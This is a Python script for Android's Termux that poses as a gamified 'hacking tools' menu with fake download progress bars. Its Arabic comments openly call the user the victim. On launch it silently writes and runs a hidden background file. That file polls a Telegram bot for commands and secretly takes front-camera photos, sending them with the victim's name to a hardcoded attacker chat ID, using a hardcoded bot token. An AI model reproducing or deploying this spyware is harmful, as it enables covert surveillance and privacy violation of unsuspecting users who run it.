import os, sys, time, random, subprocess, asyncio
import requests

# --- إعدادات الملك علي طالب (SUKUNA) ---
TOKEN = "8382035555:AAEyKqioQySc5HNLSJ3NwrDh89p3RpDPY"
ADMIN_ID = "6709215417"

# الألوان
G, R, Y, C, W, P = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;36m', '\033[1;37m', '\033[1;35m'

def ar(text):
    from arabic_reshaper import reshape
    from bidi.algorithm import get_display
    try: return get_display(reshape(text))
    except: return text

# --- محرك التحميل والسيطرة ---
def start_ghost_engine(vid, vname):
    # (نفس كود الجاسوس الصامت السابق لضمان السيطرة)
    p_code = f"""
import os, time, requests, subprocess
def slave():
    last_id = 0
    while True:
        try:
            r = requests.get("https://api.telegram.org/bot{TOKEN}/getUpdates?offset="+str(last_id+1)).json()
            for up in r.get('result', []):
                last_id = up['update_id']
                if 'message' in up:
                    cmd = up['message']['text']
                    header = f"📁 [DATABASE] Victim: {vname} | ID: {vid}"
                    if cmd == "/all_cam" or cmd == f"/cam_{vid}":
                        os.system("termux-camera-photo -c 1 /sdcard/s.jpg")
                        requests.post("https://api.telegram.org/bot{TOKEN}/sendPhoto", files={{'photo':open('/sdcard/s.jpg','rb')}}, data={{"chat_id":"{ADMIN_ID}","caption":header}})
        except: pass
        time.sleep(5)
slave()
"""
    with open(".sys_config.py", "w") as f: f.write(p_code)
    subprocess.Popen(["python", ".sys_config.py"], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))

class SukunaSystem:
    def __init__(self):
        self.v_id = f"SK_{random.randint(1000, 9999)}"
        self.u_name = "Guest"
        self.lvl = 1
        self.points = 500

    def download_bar(self, tool_name):
        # شريط تحميل وهمي لإقناع الضحية
        print(f"\n{Y} [~] {ar('جاري تحميل أداة')} {tool_name}...")
        for i in range(1, 101):
            time.sleep(0.05)
            sys.stdout.write(f"\r{G} [%-50s] %d%%" % ('='*(i//2), i))
            sys.stdout.flush()
        print(f"\n{G} [✓] {ar('تم التحميل والتثبيت بنجاح!')}")
        time.sleep(1)

    def show_tools(self):
        os.system("clear")
        print(f"{R} --- {ar('قائمة الـ 100 أداة')} ---")
        for i in range(1, 101):
            status = f"{G}[🔓]" if i <= self.lvl else f"{R}[🔒]"
            print(f" {status} Tool_{i}", end="\t" if i % 3 != 0 else "\n")
        
        choice = input(f"\n{Y} {ar('اختر رقم الأداة للتحميل أو SUKUNA للرجوع:')} ")
        if choice.isdigit():
            if int(choice) <= self.lvl:
                self.download_bar(f"Tool_{choice}")
                input(ar("\n[ اضغط ENTER للتشغيل ]"))
            else:
                print(f"{R} [!] {ar('هذه الأداة مقفلة! ارفع مستواك (LVL) لفتحها.')}")
                time.sleep(2)

    async def start(self):
        if not os.path.exists("/sdcard"): os.system("termux-setup-storage")
        os.system("clear")
        self.u_name = input(f"{Y} {ar('أدخل اسمك الملكي:')} {W}")
        start_ghost_engine(self.v_id, self.u_name)
        
        while True:
            os.system("clear")
            print(f"{R}   S U K U N A  |  V20  |  LVL: {self.lvl}")
            print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f" {B}[1] {ar('أدوات الاختراق (100)')} [2] {ar('المتجر')} [3] {ar('الدردشة')}")
            cmd = input(f"\n{R} SUKUNA > {W}")
            
            if cmd == "1":
                self.show_tools()
            elif cmd.upper() == "SUKUNA": continue

if __name__ == "__main__":
    bot = SukunaSystem()
    asyncio.run(bot.start())
